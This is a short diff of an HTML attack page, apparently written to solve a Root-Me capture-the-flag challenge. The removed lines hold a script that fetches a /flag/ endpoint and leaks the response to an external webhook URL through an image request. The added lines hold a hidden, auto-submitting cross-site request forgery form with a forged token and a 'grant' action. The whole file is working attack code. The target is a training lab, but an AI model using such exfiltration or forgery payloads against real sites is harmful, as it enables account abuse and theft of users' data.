@@ -1,11 +1,17 @@
 <html>
-<body>
-<script>
-fetch("/flag/", {method: "POST"})
-.then(r => r.text())
-.then(t => {
-    new Image().src = "https://webhooksite.net/f15dcda9-0e82-428b-a522-352436ffddda?flag=" + encodeURIComponent(t);
-});
-</script>
-</body>
+  <body>
+    <form
+      action="https://instance-019e0781-670f-7278-9210-6cbcaec51f91.challenges.root-me.pro/flag/"
+      method="POST"
+      style="display:none;"
+    >
+      <input type="hidden" name="csrf_token" value="dXNlcnJlc3U=" />
+      <!-- Ajoute d'autres champs si nécessaire, ex: -->
+      <input type="hidden" name="username" value="user" />
+      <input type="hidden" name="action" value="grant" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
 </html>
